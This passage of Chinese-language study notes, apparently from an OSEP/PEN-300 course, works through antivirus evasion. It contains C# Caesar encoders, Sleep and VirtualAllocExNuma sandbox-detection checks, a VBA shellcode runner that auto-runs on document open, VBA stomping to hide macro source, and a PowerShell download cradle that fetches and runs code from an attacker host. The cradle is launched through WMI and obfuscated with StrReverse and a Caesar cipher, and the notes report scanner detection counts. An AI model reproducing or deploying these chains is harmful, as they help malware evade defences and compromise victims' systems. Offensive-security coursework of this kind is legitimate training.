                    (byte)(((uint)buf[i] + (uint)key) & 0xFF);
            }

            StringBuilder hex =
                new StringBuilder(encoded.Length * 6);

            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The encoded payload is:");
            Console.WriteLine(hex.ToString());

            Console.ReadKey();
        }
    }
}
```
Caesar 解碼器:
```csharp
using System;
using System.Text;

namespace DecoderDemo
{
    class Program
    {
        static void Main(string[] args)
        {
            // 這是上面編碼後的測試資料
            byte[] buf = new byte[]
            {
                0xfe, 0x4a, 0x85, 0xe6, ...
            };

            int key = 2;

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] =
                    (byte)(((uint)buf[i] - (uint)key) & 0xFF);
            }

            StringBuilder hex =
                new StringBuilder(buf.Length * 6);

            foreach (byte b in buf)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The decoded payload is:");
            Console.WriteLine(hex.ToString());

            Console.ReadKey();
        }
    }
}
```

## Messing with Our Behavior
防毒不只會掃描檔案中的 byte pattern，也可能把程式放進模擬器或 sandbox 中短暫執行，觀察它是否有可疑行為，例如配置可執行記憶體、解碼 payload、建立執行緒等

### Simple Sleep Timers
防毒模擬器不可能真的等待每個程式睡眠幾秒或幾分鐘，否則掃描速度會非常慢。因此某些模擬器遇到 `Sleep();` 可能會直接「快轉」

測試：
- 記錄 Sleep 前的時間
- Sleep 兩秒
- 計算實際經過時間
- 如果經過時間明顯不足，推測自己在模擬器裡
- 直接 return
```csharp
...
[DllImport("kernel32.dll")]
static extern void Sleep(uint dwMilliseconds);
        
static void Main(string[] args)
{
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
    if(t2 < 1.5)
    {
        return;
    }
...
```
> - `DateTime t1 = DateTime.Now;`: [DateTime](https://docs.microsoft.com/en-us/dotnet/api/system.datetime?view=netframework-4.8) 物件記錄執行 Sleep 前的時間
> - `Sleep(2000);`: 要求目前執行緒暫停 2000 毫秒
> - `double t2 = DateTime.Now.Subtract(t1).TotalSeconds;`: 取得現在時間 (減去開始時間，得到經過秒數)
>
> 理論上應該經過約兩秒。可預留一些時間誤差，所以用 1.5 秒當門檻。若實際時間少於 1.5 秒，就推測 Sleep 被模擬器跳過

在 AntiScan.Me 上有 11 個產品將 C# shellcode runner 標記為已偵測\
![image](https://hackmd.io/_uploads/SJA_pfUUfx.png)
> 由於簽章偵測的偵測率相同，下一步是將加密的 shellcode 與延遲偵測結合。我們可以重複使用凱撒密碼和Sleep 函數來嘗試繞過這兩種偵測機制。

Sleep 主要針對 heuristic 或 emulator\
所以檔案裡的原始 shellcode 靜態特徵仍然存在，因此 signature detection 仍可直接命中，不需要進入模擬執行

偵測方式 | 方法 |
:------:|:--------|
靜態特徵碼  | Caesar Cipher 改變 shellcode bytes |    
模擬／行為分析   | Sleep elapsed-time 檢查


Caesar 加密後的 C# shellcode runner，只剩 6 個產品有標記 (繞過 Windows Defender)\
![image](https://hackmd.io/_uploads/SkNmg7U8Gl.png)

### Non-emulated APIs
第二種思路不透過測量時間，而是呼叫 Windows API: `VirtualAllocExNuma`
一般來說，定位 non-emulated APIs 的方法有兩種
1. 對防毒軟體模擬器進行逆向工程，但由於軟體高度複雜非常耗時
2. 針對防毒引擎測試各種 API。基本原理是當防毒軟體模擬器遇到 non-emulated APIs 時，執行將會失敗。在這種情況下，我們的惡意程式只需測試 API 的執行結果並將其與預期結果進行比較，就有機會檢測到防毒軟體的模擬行為

- [VirtualAllocExNuma](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma)
與 VirtualAllocEx 類似，用來在指定程序中配置記憶體。額外的 Numa 代表： Non-Uniform Memory Access\
NUMA 出現在多處理器或多 CPU node 系統，用來指定記憶體應優先配置在哪個 NUMA node\
一般單 CPU 工作站不太需要直接使用這個 API

比較 [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) 和 [VirtualAllocExNuma](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma) 的 C type function prototype
```csharp
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

LPVOID VirtualAllocExNuma(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect,
  DWORD  nndPreferred
);
```

最後一個參數不同: 最後是 DWORD 類型\
可以重複使用 VirtualAllocEx 的 pinvoke 導入，並手動添加一個 UInt32 類型的額外參數

```csharp
[DllImport(
    "kernel32.dll",
    SetLastError = true,
    ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(
    IntPtr hProcess,
    IntPtr lpAddress,
    uint dwSize,
    UInt32 flAllocationType,
    UInt32 flProtect,
    UInt32 nndPreferred
);
```
> - `hProcess`: 要在哪個程序配置記憶體
> - `lpAddress`: 建議配置位置；零代表讓系統決定
> - `dwSize`: 配置大小
> - `flAllocationType`: 配置類型
> - `flProtect`: 記憶體保護屬性
> - `nndPreferred`: 偏好的 NUMA node`

取得目前程序的 pseudo handle，讓程式可以在自己 procsee 的 addr 空間中測試記憶體配置:
```csharp
[DllImport("kernel32.dll")]
static extern IntPtr GetCurrentProcess();
```

指定分配記憶體的目標 NUMA node。對於 multiprocessing computer，實際上就是我們分配的實體記憶體應該所在的 CPU。由於預期是在單一 CPU 工作站上進行操作，因此我們傳遞值「0」（指定第一個 node）
```csharp
IntPtr mem = VirtualAllocExNuma(
    GetCurrentProcess(),
    IntPtr.Zero,
    0x1000,
    0x3000,
    0x4,
    0
);

if (mem == IntPtr.Zero)
{
    return;
}
```

在真實 Windows 系統上，這個 API 理論上會正常回傳有效 addr，但在缺乏完整 API 模擬的環境裡:
- 回傳零
- 回傳錯誤
- 沒有實作 API
- 行為與真實 Windows 不一致

看到失敗後就執行 `return;`，且搭配 Caesar Cipher 後只剩 4/26 引擎偵測\
![image](https://hackmd.io/_uploads/B1hij7UIzl.png)

## Office, Please Bypass Antivirus
利用 Microsoft Office 使用 VBA macros 繞過防毒軟體的偵測

### Bypassing Antivirus in VBA
先測原始 VBA shellcode runner:
```
開啟 Word 文件
     │
     ▼
Document_Open / AutoOpen
     │
     ▼
   mymacro()
     │
     ├── buf = Array(shellcode ...)
     │
     ├── VirtualAlloc()
     │       ↓
     │   配一塊 RWX 記憶體
     │
     ├── RtlMoveMemory()
     │       ↓
     │   shellcode 搬進記憶體
     │
     └── CreateThread()
             ↓
        從 shellcode 起始位置執行
```
```VBA
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
...
49, 57, 50, 46, 49, 54, 56, 46, 49, 55, 54, 46, 49, 52, 50, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub

End Function
```
以上 VBA 在 AntiScan.Me 查詢仍可以被 7/26 個產品識別\
(整份 VBA 看起來仍然像 典型的 shellcode injection / shellcode runner execution chain)\
![image](https://hackmd.io/_uploads/ByWq3eDUMg.png)

🧠：嘗試使用 Caesar 密碼加密 shellcode 來進一步提升結果。可以將 shellcode 加密成 VBA 適用的輸出格式

將先前的 C# project 來加密 shellcode，然後將加密結果複製到 VBA macro 中，VBA 使用 decimal 十進位表示
```csharp
1   byte[] encoded = new byte[buf.Length];
2   for(int i = 0; i < buf.Length; i++)
3   {
4     encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
5   }
6 
7   uint counter = 0;
8 
9   StringBuilder hex = new StringBuilder(encoded.Length * 2);
10  foreach(byte b in encoded)
11  {
12    hex.AppendFormat("{0:D}, ", b);
13    counter++;
14    if(counter % 50 == 0)
15    {
16        hex.AppendFormat("_{0}", Environment.NewLine);
17    }
18  }
19  Console.WriteLine("The payload is: " + hex.ToString());
```
進行簡單的 Caesar-style byte shift：
```csharp
byte[] encoded = new byte[buf.Length];

for(int i = 0; i < buf.Length; i++)
{
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
}
```
![image](https://hackmd.io/_uploads/rkS2HZPUfx.png)
> 加密的 shellcode 沒有顯著幫助

>[!Tip]
>為什麼原本期待 Caesar-style byte shift 能降低偵測？
>> 因為如果 AV signature 是：
>>```
>> E8 82 00 00 00 60 89 E5 ...
>>```
>>encode 後就變：
>>```
>>EA 84 02 02 02 62 8B E7 ...
>>```
>> 因此固定 byte signature 不再 match\
>>這個思路在前面的 C# runner 實驗有效，但結果仍是 7 / 26 ，所以 payload byte sequence 顯然不是主要 detection source，至少不是唯一的 source

利用 Sleep / time-lapse 檢查是不是 AV emulator / sandbox heuristic 在抓
```csharp
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
...
Dim t1 As Date
Dim t2 As Date
Dim time As Long

t1 = Now()
Sleep (2000)
t2 = Now()
time = DateDiff("s", t1, t2)

If time < 2 Then
    Exit Function
End If
...
```
> - `DateDiff("s", t1, t2)`: 第一個參數"s" 代表 seconds\
> DateDiff(單位,開始,結束)

### Stomping On Microsoft Word
上述 Caesar encoding、Sleep timing 都沒有顯著效果，AV 很可能直接掃 VBA 原始碼

>[!Important]
>Office 文件舊格式：`.doc`, `.xls`
>使用 [Compound File Binary Format](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cfb/53989ce4-7b05-4f8d-829b-d08d6148375b) (CFBF)，可以理解成檔案裡面包含很多 stream 與 storage ，很像一個迷你的檔案系統
>```
>document.doc
>│
>├── WordDocument
>├── 1Table
>├── SummaryInformation
>├── Macros
>│   └── VBA
>│       ├── PROJECT
>│       ├── _VBA_PROJECT
>│       ├── dir
>│       └── NewMacros
>└── ...
>```
>.doc 實際上有很多獨立資料結構
>
> 新 Office Open XML 格式：`.docx`, `.docm`, `.xlsx`, `.xlsm`\
> 比較接近 ZIP archive
> ```
> document.docm
>│
>├── [Content_Types].xml
>├── word/
>│   ├── document.xml
>│   ├── styles.xml
>│   ├── relationships...
>│   └── vbaProject.bin
>└── ...
> ```
> 對 Macro-enabled Office 文件 `.docm`, `.xlsm` VBA 相關內容會放在 `vbaProject.bin` (vbaProject.bin 本身使用 OLE/CFBF 結構)
> ```
> DOCM
> ↓
>ZIP
> ↓
>vbaProject.bin
> ↓
>OLE Compound File
> ↓
>VBA structures
> ```

(Office 文件底層儲存了哪些 bytes / streams)\
可以利用第三方工具 [FlexHEX](https://www.heaventools.com/download-hex-editor.htm) 解開 .doc 文件 (File > Open > OLE Compound File)\
![image](https://hackmd.io/_uploads/r1XciMuUGl.png)\
在左側欄位中可以看到 Macro 和 VBA folder\
![image](https://hackmd.io/_uploads/Sk5hsMOLfx.png)

在 PROJECT 文件中，包含 project information 顯示 Module=NewMacros，得知 VBA project metadata
![image](https://hackmd.io/_uploads/rySThM_Ufe.png)

如果能在 editor 中移除這個 link，就能在 Office VBA 編輯器中隱藏巨集:\
選取 ASCII 字串，然後選擇 Edit > Insert Zero Block\
![image](https://hackmd.io/_uploads/ByfJCGd8Gx.png)\
![image](https://hackmd.io/_uploads/SJX3gXdLMl.png)

VBA 有兩份 code  
PerformanceCache
```
VBA Module
│
├── Source Code
│
└── P-code
```
1. Textual VBA source
```vba
Sub AutoOpen()
    mymacro
End Sub
```
2. Compiled P-code
P-code 是 VBA 編譯後的中間 representation (binary)\
P-code = Pseudo-code / Packed code / interpreted bytecode 類型的中間碼

用途是為了 performance，把先前編譯好的 VBA code cache 起來\
透過 FlexHEX 查看 NewMacros 的 P-code：\
![image](https://hackmd.io/_uploads/Hkabk8_IGx.png)
> 仍可以看到 ` Attribute VB_Name = "New Macros"` 後面的 Win32 API import，再往下可以看到剩餘的 VBA code

也可以透過 P-code 得知 Word 文件的建立版本和版本號
![image](https://hackmd.io/_uploads/SJP57L_Lzx.png)
> 使用 Microsoft Office 2016 (VBE7.DLL)，並安裝在 32-bit 版本資料夾 `C:\Program Files(x86)` 中\
> (少數 AV 會檢查 P-code)

嘗試利用 encrypted shellcode 繞過：\
先找到"Attribute VB_Name"\
![image](https://hackmd.io/_uploads/HyYw2UO8Gl.png)\
![image](https://hackmd.io/_uploads/rJwtT8dLze.png)

選取到結尾， Edit > Insert Zero Block\
![image](https://hackmd.io/_uploads/rkn_p8d8Mg.png)

Insert Zero Block 後開啟 Word 會發現 NewMacro 變成空白\
![image](https://hackmd.io/_uploads/Syj6pIuUzl.png)

🥚...仍然收到 reverse shell 
代表即使 VBA source code 被移除，P-code 仍會執行

(AntiScan.Me)\
![image](https://hackmd.io/_uploads/HkdfCIuLfl.png)

## Hiding PowerShell Inside VBA
### Detection of PowerShell Shellcode Runner
使用 PowerShell shellcode runner 下載工具
```vba
Sub MyMacro()
  Dim strArg As String
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://{KALI_IP}/run.txt'))"
  Shell strArg, vbHide
End Sub
```
卻被 8 款 AV 偵測\
![image](https://hackmd.io/_uploads/B18D1DdLMl.png)
> 原因：
> 1. 使用 Shell method
> 2. PowerShell download cradle

當 PowerShell process 直接從 VBA 程式碼建立時，會成為 Microsoft Word 的 child process，這種行為很可疑

### Dechaining with WMI
為了解決這些問題，可以利用 [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)(WMI) 框架來解決 PowerShell 作為 Office child process 的問題\
使用 WMI 查詢、篩選和解析 Windows OS 上的大量資訊。也可以使用它來建立新 process

首先，我們將透過 VBA 中的 [GetObject](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/getobject-function) method 連接到 WMI，並指定 [winmgmts](https://docs.microsoft.com/en-us/windows/win32/wmisdk/winmgmt) class name\
(Winmgmt 是執行在 LocalSystem account 中 SVCHOST process 的 WMI 服務)\
執行操作時，Winmgmt WMI 服務會在單獨的 process 中創建，作為 [Wmiprvse.exe](https://docs.microsoft.com/en-us/windows/win32/wmisdk/provider-hosting-and-security) 的 subprocess，代表我們可以將 PowerShell 與 Microsoft Word de-chain
```vba
Sub MyMacro
  strArg = "powershell"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```

當 macro 執行時，會開啟一個新的 PowerShell prompt，在 Process Explorer 會顯示 PowerShell 確實是作為 WmiPrvSE.exe 的 child process 運行 (NOT Microsoft Word)\
![image](https://hackmd.io/_uploads/SyjswPdUMg.png)

PowerShell 是 64-bit process
```vba
Sub MyMacro
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://{KALI_IP}/run.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```
![image](https://hackmd.io/_uploads/Sk_MtvO8ze.png)
> 仍然有未混淆的 PowerShell 下載腳本

### Obfuscating VBA
對文字[混淆處理](https://en.wikipedia.org/wiki/Obfuscation_(software)) 以隱藏內容，使其不被防毒軟體偵測到\
👉🏻 目前的 VBA macro 包含：PowerShell download cradle、WMI connection string 和WMI class name

VBA 中有一個名為 [StrReverse](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/strreverse-function) 的函數，接收輸入字串後會傳回順序反轉後的字串，以繞過簽名偵測 signature detections

我們可以用多種方法反轉字串內容，可以使用 [Code Beautify](https://codebeautify.org/reverse-string) 線上資源\
```vba
Sub Mymacro()
Dim strArg As String
strArg = StrReverse("))'txt.nur/{PI_ILAK}//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")

GetObject(StrReverse(":stmgmniw")).Get(StrReverse("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```
建立新函數直接呼叫`StrReverse`，減少 code 中的出現次數
```vba
Function bears(cows)
    bears = StrReverse(cows)
End Function

Sub Mymacro()
Dim strArg As String
strArg = bears("))'txt.nur/{PI_ILAK}//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")

GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```
![image](https://hackmd.io/_uploads/rJoZhvuIMx.png)
> 因為存在 StrReverse，一些 advanced detection engines 還是會偵測到

再透過將 ASCII 字串轉換為其十進位表示，然後做 Caesar cipher encryption 更複雜的混淆

在 PowerShell 中建立一個加密腳本:\
建立 $payload 的輸入變量，包含要加密的字串；同時建立 $output 的變量，包含加密後的字串\
透過 [ToCharArray](https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8) method 將整個字串轉換為字元數組，然後 使用「%」簡寫透過 [Foreach](https://ss64.com/ps/foreach-object.html) 循環來輸出
```vba
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://{KALI_IP}/run.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip
```
在迴圈內每個字元的位元組值都加 17 (17 是本次中選取的凱撒密碼金鑰)
用 if/else 條件將字元的十進位表示填入三位數字\
最後，將每個十進制值附加到輸出字串，並透過 [clip](https://devblogs.microsoft.com/scripting/powertip-send-output-to-clipboard-with-powershell/) 函數將其複製到剪貼簿。執行 PowerShell 腳本後，剪貼簿會輸出以下：
```
1291281361181311321211181251250490621181371181160491151381291141321320
4906212712812904906213604912112211711711812704906211604912211813705705
7127118136062128115123118116133049132138132133118126063127118133063136
1181151161251221181271330580631171281361271251281141171321331311221271
2005705612113313312907506406406607406706306607107306306606607406306606
7065064115128128124063133137133056058058
```

搭配解密 workflow，Nuts 的主要函數執行 while loop，遍歷整個加密字串，其中 Oatmilk 變數累積解密後的字串\
(用食物當作 Function name)
```vba
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function
```
解密程式實作後，可以用來解密並執行 PowerShell 下載腳本：
```vba
Function MyMacro()
    Dim Apples As String
    Dim Water As String
    
    Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058"
    Water = Nuts(Apples)
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function
```
![image](https://hackmd.io/_uploads/BkT8gOOUGg.png)

繞過 heuristics 部需使用 Win32 API：在 macro 運行時檢查文件名\
大多數 AV 在模擬執行文件時會重新命名文件。執行過程中，我們會檢查文件名稱，如果發現與最初提供的名稱不同，則可以判定執行程序已被模擬，並退出程式碼\
👉🏻 假設將文件命名為 runner.doc。如果檢查 ActiveDocument 的 Name 屬性，發現它不是 runner.doc 就退出以避免 heuristics detection
```vba
If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
  Exit Function
End If
```
![image](https://hackmd.io/_uploads/Sk35WOO8zx.png)

# Advanced Antivirus Evasion

>[!Caution]
> HackMD 筆記長度限制，接續 [[OSEP, PEN-300] Instructional notes - Part 4](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-4/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 4"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-4/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 5"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-5/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 6"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-6/)
